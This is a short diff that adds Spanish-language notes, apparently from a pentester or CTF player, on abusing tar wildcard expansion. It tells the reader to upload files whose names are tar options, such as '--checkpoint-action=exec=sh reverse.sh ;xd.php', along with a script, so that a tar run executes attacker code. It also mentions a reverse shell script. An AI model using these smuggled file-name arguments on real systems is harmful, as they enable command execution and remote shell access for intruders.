@@ -1,0 +1,8 @@
+Para Tar:
+hay que subir mínimo 1 fichero mínimamente grandito (+200kb) terminado en .php
+
+Una de estas (o utilizar los comandos que queramos, siempre que sean interpretables por el SO)
+--checkpoint-action=exec=sh reverse.sh ;xd.php
+--checkpoint-action=exec=php fichero.php
+Lo más cómodo suele ser un script y ejecutarlo con checkpoint
+Subir también el script
